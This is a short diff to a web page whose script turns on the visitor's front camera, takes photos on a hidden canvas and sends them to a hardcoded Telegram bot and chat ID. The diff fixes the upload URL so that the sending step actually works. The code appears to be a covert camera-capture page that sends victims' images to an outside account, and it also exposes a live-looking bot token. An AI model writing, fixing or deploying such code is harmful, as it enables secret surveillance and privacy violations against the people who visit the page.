@@ -28,7 +28,6 @@
   <div>
     <video id="video" autoplay playsinline width="320" height="240"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-   
   </div>
 
   <script>
@@ -36,8 +35,8 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
-    const TELEGRAM_BOT_TOKEN = '7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8';  // Replace with your bot token
-    const TELEGRAM_CHAT_ID = '6128322651';              // Replace with your chat ID
+    const TELEGRAM_BOT_TOKEN = '7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8';  // Your bot token
+    const TELEGRAM_CHAT_ID = '6128322651';              // Your chat ID
 
     // Access the user's front camera
     async function startCamera() {
@@ -62,7 +61,7 @@
       formData.append('photo', blob, 'photo.png');
 
       // Send the photo to Telegram
-      fetch(`https://api.telegram.org/bot$7640540352:AAGF09r5VkmVLAUJezWKvsWuz4r96ykeUa8/sendPhoto`, {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: 'POST',
         body: formData
       })
